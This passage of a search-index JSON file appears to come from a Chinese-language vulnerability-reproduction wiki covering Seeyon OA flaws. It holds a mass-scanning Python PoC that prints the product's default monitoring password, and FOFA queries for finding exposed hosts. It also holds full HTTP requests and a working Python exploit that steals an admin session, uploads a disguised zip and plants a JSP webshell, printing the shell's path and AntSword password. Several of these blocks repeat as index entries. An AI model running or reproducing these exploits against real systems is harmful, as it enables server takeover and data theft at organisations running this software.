\uff0c\u9ed8\u8ba4\u5bc6\u7801\u4e3a: WLCCYBD@SEEYON \\033 [0m\" . format ( target_url , vuln_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url )) def Scan ( file_name ): with open ( file_name , \"r\" , encoding = 'utf8' ) as scan_url : for url in scan_url : if url [: 4 ] != \"http\" : url = \"http://\" + url url = url . strip ( ' \\n ' ) try : POC_1 ( url ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" . format ( e )) continue if __name__ == '__main__' : title () file_name = str ( input ( \" \\033 [35mPlease input Attack File \\n File >>> \\033 [0m\" )) Scan ( file_name ) Goby & POC \u00b6 [!NOTE] Seeyon OA A8-m Information leakage","title":"\u81f4\u8fdcOA A8 \u72b6\u6001\u76d1\u63a7\u9875\u9762\u4fe1\u606f\u6cc4\u9732"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20%E7%8A%B6%E6%80%81%E7%9B%91%E6%8E%A7%E9%A1%B5%E9%9D%A2%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u81f4\u8fdcoa-a8-\u72b6\u6001\u76d1\u63a7\u9875\u9762\u4fe1\u606f\u6cc4\u9732","text":"","title":"\u81f4\u8fdcOA A8 \u72b6\u6001\u76d1\u63a7\u9875\u9762\u4fe1\u606f\u6cc4\u9732"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20%E7%8A%B6%E6%80%81%E7%9B%91%E6%8E%A7%E9%A1%B5%E9%9D%A2%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u81f4\u8fdcOA A8-m \u5b58\u5728\u72b6\u6001\u76d1\u63a7\u9875\u9762\u4fe1\u606f\u6cc4\u9732\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4ece\u5176\u4e2d\u83b7\u53d6\u7f51\u7ad9\u8def\u5f84\u548c\u7528\u6237\u540d\u7b49\u654f\u611f\u4fe1\u606f\u8fdb\u4e00\u6b65\u653b\u51fb","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20%E7%8A%B6%E6%80%81%E7%9B%91%E6%8E%A7%E9%A1%B5%E9%9D%A2%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u81f4\u8fdcOA A8-m","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20%E7%8A%B6%E6%80%81%E7%9B%91%E6%8E%A7%E9%A1%B5%E9%9D%A2%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#fofa","text":"[!NOTE] title=\"A8-m\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20%E7%8A%B6%E6%80%81%E7%9B%91%E6%8E%A7%E9%A1%B5%E9%9D%A2%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee\u76d1\u63a7\u9875\u9762 http://xxx.xxx.xxx.xx/seeyon/management/status.jsp \u540e\u53f0\u5bc6\u7801\u4e3a WLCCYBD@SEEYON \u767b\u5f55\u540e\u901a\u8fc7\u5982\u4e0burl\u83b7\u5f97\u4e00\u4e9b\u654f\u611f\u4fe1\u606f /seeyon/management/status.jsp /seeyon/logs/login.log /seeyon/logs/v3x.log","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20%E7%8A%B6%E6%80%81%E7%9B%91%E6%8E%A7%E9%A1%B5%E9%9D%A2%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] \u591a\u4e2a\u76ee\u6807 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA A6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mFile >>> ip.txt \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/seeyon/management/index.jsp\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if response . status_code == 200 and \"Password\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u540e\u53f0\u76d1\u63a7\u5730\u5740 {} \uff0c\u9ed8\u8ba4\u5bc6\u7801\u4e3a: WLCCYBD@SEEYON \\033 [0m\" . format ( target_url , vuln_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url )) def Scan ( file_name ): with open ( file_name , \"r\" , encoding = 'utf8' ) as scan_url : for url in scan_url : if url [: 4 ] != \"http\" : url = \"http://\" + url url = url . strip ( ' \\n ' ) try : POC_1 ( url ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" . format ( e )) continue if __name__ == '__main__' : title () file_name = str ( input ( \" \\033 [35mPlease input Attack File \\n File >>> \\033 [0m\" )) Scan ( file_name )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20%E7%8A%B6%E6%80%81%E7%9B%91%E6%8E%A7%E9%A1%B5%E9%9D%A2%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#goby--poc","text":"[!NOTE] Seeyon OA A8-m Information leakage","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20Session%E6%B3%84%E9%9C%B2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","text":"\u81f4\u8fdcOA Session\u6cc4\u9732 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u81f4\u8fdcOA\u901a\u8fc7\u53d1\u9001\u7279\u6b8a\u8bf7\u6c42\u83b7\u53d6session\uff0c\u5728\u901a\u8fc7\u6587\u4ef6\u4e0a\u4f20\u63a5\u53e3\u4e0a\u4f20webshell\u63a7\u5236\u670d\u52a1\u5668 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u81f4\u8fdcOA FOFA \u00b6 [!NOTE] title=\"\u81f4\u8fdc\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u9996\u5148\u8981\u83b7\u53d6\u7ba1\u7406\u5458cookie POST / seeyon / thirdpartyController . do HTTP / 1.1 Host : xxx . xxx . xxx . xxx User - Agent : python - requests / 2.25.1 Accept - Encoding : gzip , deflate Accept : * /* Connection : close Content - Length : 133 Content - Type : application / x - www - form - urlencoded method = access & enc = TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04 % 2 BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4 & clientPath = 127.0.0.1 [!NOTE] \u8fd4\u56de\u5305\u51fa\u73b0 Sset-Cookie \u548c a8genius.do \u5373\u4e3a\u6210\u529f\u83b7\u53d6 \u4e0a\u4f20\u538b\u7f29\u5305\u6dfb\u52a0 Cookie\u4e0a\u4f20 POST / seeyon / fileUpload . do ? method = processUpload HTTP / 1.1 Host : xxx . xxx . xxx . xxx Connection : close Accept - Encoding : gzip , deflate Accept : * /* User - Agent : python - requests / 2.25.1 Cookie : JSESSIONID = 3495 C4DEF87200EA323B1CA31E3B7DF5 Content - Length : 841 Content - Type : multipart / form - data ; boundary = 59229605 f98b8cf290a7b8908b34616b -- 59229605 f98b8cf290a7b8908b34616b Content - Disposition : form - data ; name = \"firstSave\" true -- 59229605 f98b8cf290a7b8908b34616b Content - Disposition : form - data ; name = \"callMethod\" resizeLayout -- 59229605 f98b8cf290a7b8908b34616b Content - Disposition : form - data ; name = \"isEncrypt\" 0 -- 59229605 f98b8cf290a7b8908b34616b Content - Disposition : form - data ; name = \"takeOver\" false -- 59229605 f98b8cf290a7b8908b34616b Content - Disposition : form - data ; name = \"type\" 0 -- 59229605 f98b8cf290a7b8908b34616b Content - Disposition : form - data ; name = \"file1\" ; filename = \"peiqi.png\" Content - Type : image / png PK .................... ______ -- 59229605 f98b8cf290a7b8908b34616b -- \u7136\u540e\u6784\u9020\u8bf7\u6c42\u89e3\u538b\u538b\u7f29\u5305 POST / seeyon / ajax . do HTTP / 1.1 Host : 192.168.10.2 User - Agent : python - requests / 2.25.1 Accept - Encoding : gzip , deflate Accept : * /* Connection : close Content - Type : application / x - www - form - urlencoded Cookie : JSESSIONID = BDF7358D4C35C6D2BB99FADFEE21F913 Content - Length : 157 method = ajaxAction & managerName = portalDesignerManager & managerMethod = uploadPageLayoutAttachment & arguments =% 5 B0 % 2 C % 222021 - 04 - 09 % 22 % 2 C % 225818374431215601542 % 22 % 5 D \u72b6\u6001\u7801\u8fd4\u56de500\u5373\u4e3a\u4e0a\u4f20\u6210\u529f \u6f0f\u6d1ePOC \u00b6 [!NOTE] \u811a\u672c\u5728\u6587\u4ef6\u76ee\u5f55\u7684 POC\u4e2d \u5176\u4e2d\u542b\u6709zip\u538b\u7f29\u5305 shell.zip, \u5982\u679c\u4e0a\u4f20\u5931\u8d25\u66f4\u6539\u4e00\u4e0b\u6587\u4ef6\u540d # coding: utf-8 import requests import sys import random import time import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/seeyon/thirdpartyController.do\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , } data = \"method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) if response . status_code == 200 and \"a8genius.do\" in response . text and 'set-cookie' in str ( response . headers ) . lower (): cookies = response . cookies cookies = requests . utils . dict_from_cookiejar ( cookies ) cookie = cookies [ 'JSESSIONID' ] targeturl = target_url + '/seeyon/fileUpload.do?method=processUpload' print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6b63\u5728\u4e0a\u4f20\u538b\u7f29\u5305\u6587\u4ef6.... \\n [o] Cookie: {} \\033 [0m\" . format ( target_url , cookie )) files = [( 'file1' , ( '360icon.png' , open ( 'shell.zip' , 'rb' ), 'image/png' ))] headers = { 'Cookie' : \"JSESSIONID= %s \" % cookie } data = { 'callMethod' : 'resizeLayout' , 'firstSave' : \"true\" , 'takeOver' : \"false\" , \"type\" : '0' , 'isEncrypt' : \"0\" } response = requests . post ( url = targeturl , files = files , data = data , headers = headers , timeout = 60 , verify = False ) reg = re . findall ( 'fileurls=fileurls\\+\",\"\\+ \\' (.+) \\' ' , response . text , re . I ) if len ( reg ) == 0 : sys . exit ( \"\u4e0a\u4f20\u6587\u4ef6\u5931\u8d25\" ) POC_2 ( target_url , cookie , reg , headers ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url ), e ) def POC_2 ( target_url , cookie , reg , headers ): vuln_url = target_url + '/seeyon/ajax.do' datestr = time . strftime ( '%Y-%m- %d ' ) post = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + datestr + ' %22% 2C%22' + reg [ 0 ] + ' %22% 5D' headers [ 'Content-Type' ] = \"application/x-www-form-urlencoded\" print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6b63\u5728\u89e3\u538b\u6587\u4ef6.... \\033 [0m\" . format ( target_url )) try : response = requests . post ( vuln_url , data = post , headers = headers , timeout = 60 , verify = False ) if response . status_code == 500 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u89e3\u538b\u6587\u4ef6\u6210\u529f.... \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u9ed8\u8ba4Webshell\u5730\u5740: {} /seeyon/common/designer/pageLayout/peiqi10086.jsp \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u8681\u5251\u5bc6\u7801: peiqi \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u5982\u679c\u76ee\u6807webshell\u65e0\u6cd5\u8bbf\u95ee\uff0c\u8bf7\u66f4\u6362 peiqi_test.zip \u4e2d\u7684\u6728\u9a6c\u540d\u79f0 \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url ), e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u81f4\u8fdcOA Session\u6cc4\u9732 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20Session%E6%B3%84%E9%9C%B2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u81f4\u8fdcoa-session\u6cc4\u9732-\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e","text":"","title":"\u81f4\u8fdcOA Session\u6cc4\u9732 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20Session%E6%B3%84%E9%9C%B2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u81f4\u8fdcOA\u901a\u8fc7\u53d1\u9001\u7279\u6b8a\u8bf7\u6c42\u83b7\u53d6session\uff0c\u5728\u901a\u8fc7\u6587\u4ef6\u4e0a\u4f20\u63a5\u53e3\u4e0a\u4f20webshell\u63a7\u5236\u670d\u52a1\u5668","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20Session%E6%B3%84%E9%9C%B2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u81f4\u8fdcOA","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20Session%E6%B3%84%E9%9C%B2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] title=\"\u81f4\u8fdc\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20Session%E6%B3%84%E9%9C%B2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u9996\u5148\u8981\u83b7\u53d6\u7ba1\u7406\u5458cookie POST / seeyon / thirdpartyController . do HTTP / 1.1 Host : xxx . xxx . xxx . xxx User - Agent : python - requests / 2.25.1 Accept - Encoding : gzip , deflate Accept : * /* Connection : close Content - Length : 133 Content - Type : application / x - www - form - urlencoded method = access & enc = TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04 % 2 BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4 & clientPath = 127.0.0.1 [!NOTE] \u8fd4\u56de\u5305\u51fa\u73b0 Sset-Cookie \u548c a8genius.do \u5373\u4e3a\u6210\u529f\u83b7\u53d6 \u4e0a\u4f20\u538b\u7f29\u5305\u6dfb\u52a0 Cookie\u4e0a\u4f20 POST / seeyon / fileUpload . do ? method = processUpload HTTP / 1.1 Host : xxx . xxx . xxx . xxx Connection : close Accept - Encoding : gzip , deflate Accept : * /* User - Agent : python - requests / 2.25.1 Cookie : JSESSIONID = 3495 C4DEF87200EA323B1CA31E3B7DF5 Content - Length : 841 Content - Type : multipart / form - data ; boundary = 59229605 f98b8cf290a7b8908b34616b -- 59229605 f98b8cf290a7b8908b34616b Content - Disposition : form - data ; name = \"firstSave\" true -- 59229605 f98b8cf290a7b8908b34616b Content - Disposition : form - data ; name = \"callMethod\" resizeLayout -- 59229605 f98b8cf290a7b8908b34616b Content - Disposition : form - data ; name = \"isEncrypt\" 0 -- 59229605 f98b8cf290a7b8908b34616b Content - Disposition : form - data ; name = \"takeOver\" false -- 59229605 f98b8cf290a7b8908b34616b Content - Disposition : form - data ; name = \"type\" 0 -- 59229605 f98b8cf290a7b8908b34616b Content - Disposition : form - data ; name = \"file1\" ; filename = \"peiqi.png\" Content - Type : image / png PK .................... ______ -- 59229605 f98b8cf290a7b8908b34616b -- \u7136\u540e\u6784\u9020\u8bf7\u6c42\u89e3\u538b\u538b\u7f29\u5305 POST / seeyon / ajax . do HTTP / 1.1 Host : 192.168.10.2 User - Agent : python - requests / 2.25.1 Accept - Encoding : gzip , deflate Accept : * /* Connection : close Content - Type : application / x - www - form - urlencoded Cookie : JSESSIONID = BDF7358D4C35C6D2BB99FADFEE21F913 Content - Length : 157 method = ajaxAction & managerName = portalDesignerManager & managerMethod = uploadPageLayoutAttachment & arguments =% 5 B0 % 2 C % 222021 - 04 - 09 % 22 % 2 C % 225818374431215601542 % 22 % 5 D \u72b6\u6001\u7801\u8fd4\u56de500\u5373\u4e3a\u4e0a\u4f20\u6210\u529f","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20Session%E6%B3%84%E9%9C%B2%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1epoc","text":"[!NOTE] \u811a\u672c\u5728\u6587\u4ef6\u76ee\u5f55\u7684 POC\u4e2d \u5176\u4e2d\u542b\u6709zip\u538b\u7f29\u5305 shell.zip, \u5982\u679c\u4e0a\u4f20\u5931\u8d25\u66f4\u6539\u4e00\u4e0b\u6587\u4ef6\u540d # coding: utf-8 import requests import sys import random import time import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/seeyon/thirdpartyController.do\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , } data = \"method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) if response . status_code == 200 and \"a8genius.do\" in response . text and 'set-cookie' in str ( response . headers ) . lower (): cookies = response . cookies cookies = requests . utils . dict_from_cookiejar ( cookies ) cookie = cookies [ 'JSESSIONID' ] targeturl = target_url + '/seeyon/fileUpload.do?method=processUpload' print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6b63\u5728\u4e0a\u4f20\u538b\u7f29\u5305\u6587\u4ef6.... \\n [o] Cookie: {} \\033 [0m\" . format ( target_url , cookie )) files = [( 'file1' , ( '360icon.png' , open ( 'shell.zip' , 'rb' ), 'image/png' ))] headers = { 'Cookie' : \"JSESSIONID= %s \" % cookie } data = { 'callMethod' : 'resizeLayout' , 'firstSave' : \"true\" , 'takeOver' : \"false\" , \"type\" : '0' , 'isEncrypt' : \"0\" } response = requests . post ( url = targeturl , files = files , data = data , headers = headers , timeout = 60 , verify = False ) reg = re . findall ( 'fileurls=fileurls\\+\",\"\\+ \\' (.+) \\' ' , response . text , re . I ) if len ( reg ) == 0 : sys . exit ( \"\u4e0a\u4f20\u6587\u4ef6\u5931\u8d25\" ) POC_2 ( target_url , cookie , reg , headers ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url ), e ) def POC_2 ( target_url , cookie , reg , headers ): vuln_url = target_url + '/seeyon/ajax.do' datestr = time . strftime ( '%Y-%m- %d ' ) post = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + datestr + ' %22% 2C%22' + reg [ 0 ] + ' %22% 5D' headers [ 'Content-Type' ] = \"application/x-www-form-urlencoded\" print ( \" \\033 [32m[o] \u76ee\u6807 {} \u6b63\u5728\u89e3\u538b\u6587\u4ef6.... \\033 [0m\" . format ( target_url )) try : response = requests . post ( vuln_url , data = post , headers = headers , timeout = 60 , verify = False ) if response . status_code == 500 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u89e3\u538b\u6587\u4ef6\u6210\u529f.... \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u9ed8\u8ba4Webshell\u5730\u5740: {} /seeyon/common/designer/pageLayout/peiqi10086.jsp \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u8681\u5251\u5bc6\u7801: peiqi \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] \u5982\u679c\u76ee\u6807webshell\u65e0\u6cd5\u8bbf\u95ee\uff0c\u8bf7\u66f4\u6362 peiqi_test.zip \u4e2d\u7684\u6728\u9a6c\u540d\u79f0 \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url ), e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1ePOC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20CNVD-2021-01627/","text":"\u81f4\u8fdcOA ajax.do\u767b\u5f55\u7ed5\u8fc7 \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 CNVD-2021-01627 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u81f4\u8fdcOA\u662f\u4e00\u5957\u529e\u516c\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6\u3002\u8fd1\u65e5\uff0c\u5947\u5b89\u4fe1CERT\u76d1\u6d4b\u5230\u81f4\u8fdcOA\u7684\u76f8\u5173\u6f0f\u6d1e\u4fe1\u606f\u3002\u7531\u4e8e\u81f4\u8fdcOA\u65e7\u7248\u672c\u67d0\u4e9b\u63a5\u53e3\u5b58\u5728\u672a\u6388\u6743\u8bbf\u95ee\uff0c\u4ee5\u53ca\u90e8\u5206\u51fd\u6570\u5b58\u5728\u8fc7\u6ee4\u4e0d\u8db3\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u53ef\u5728\u65e0\u9700\u767b\u5f55\u7684\u60c5\u51b5\u4e0b\u4e0a\u4f20\u6076\u610f\u811a\u672c\u6587\u4ef6\uff0c\u4ece\u800c\u63a7\u5236\u670d\u52a1\u5668\u3002\u81f4\u8fdcOA\u5b98\u65b9\u5df2\u9488\u5bf9\u8be5\u6f0f\u6d1e\u63d0\u4f9b\u8865\u4e01\u3002\u9274\u4e8e\u6f0f\u6d1e\u5371\u5bb3\u8f